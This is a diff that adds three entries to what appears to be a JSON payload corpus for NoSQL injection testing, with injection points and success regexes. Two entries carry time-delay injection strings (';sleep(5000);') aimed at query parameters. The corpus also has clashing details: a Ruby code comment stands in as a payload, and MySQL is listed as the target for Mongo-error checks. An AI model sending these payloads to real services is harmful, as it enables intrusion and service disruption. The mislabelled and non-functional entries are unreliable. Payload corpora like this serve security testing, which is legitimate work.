@@ -119,5 +119,38 @@
       "expected_status_code": 200,
       "success_regex": "admin"
     }
+  },
+  {
+    "payload_id": "OWP-242576",
+    "vulnerability_category": "Injection (NoSQLi)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "# CHARSET = (?!..?~).to_a # all ASCII printable characters",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "MongoError|bson|\\$where|\\$gt"
+    }
+  },
+  {
+    "payload_id": "OWP-242577",
+    "vulnerability_category": "Injection (NoSQLi)",
+    "target_technology": "MySQL",
+    "injection_point": "query_parameter",
+    "payload_string": "';sleep(5000);'",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "MongoError|bson|\\$where|\\$gt"
+    }
+  },
+  {
+    "payload_id": "OWP-242578",
+    "vulnerability_category": "Injection (NoSQLi)",
+    "target_technology": "MySQL",
+    "injection_point": "query_parameter",
+    "payload_string": "';sleep(5000);+'",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "MongoError|bson|\\$where|\\$gt"
+    }
   }
 ]
